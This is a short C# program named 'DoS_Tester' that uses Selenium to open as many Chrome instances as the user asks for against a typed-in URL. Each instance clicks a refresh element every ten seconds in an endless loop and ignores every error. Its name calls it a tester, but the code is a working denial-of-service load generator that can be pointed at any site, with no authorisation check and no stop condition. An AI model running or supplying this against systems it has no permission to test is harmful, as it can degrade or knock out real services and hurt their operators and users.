using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Threading;

namespace DoS_Tester
{
    internal class Program
    {
        private static void Main()
        {
            Console.WriteLine("Please enter the URL:");
            string url = Console.ReadLine();

            Console.WriteLine("Please enter the number of instances to run:");
            int dosLimit;
            string tmpDosLimit = Console.ReadLine();

            while (!int.TryParse(tmpDosLimit, out dosLimit))
            {
                Console.WriteLine("Not a valid number, try again.");
                tmpDosLimit = Console.ReadLine();
            }
            
            for (int i = 0; i < dosLimit; i++)
            {
                Start(url);
            }
            
            Console.WriteLine("Done!");
            Console.ReadLine();
        }

        public static Thread Start(string url)
        {
            Thread thread = new Thread(() => RunPage(url));
            thread.Start();
            return thread;
        }

        public static void RunPage(string url)
        {
            IWebDriver driver = new ChromeDriver(System.Reflection.Assembly.GetExecutingAssembly().Location);
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;
                driver.Navigate().GoToUrl(url);
                while (true)
                {
                    try
                    {
                        driver.FindElement(By.CssSelector("[id$=refresh]")).Click();
                        Thread.Sleep(10000);
                    }
                    catch (Exception e)
                    {
                        //ignore
                    }
                }
            }).Start();
        }
    }
}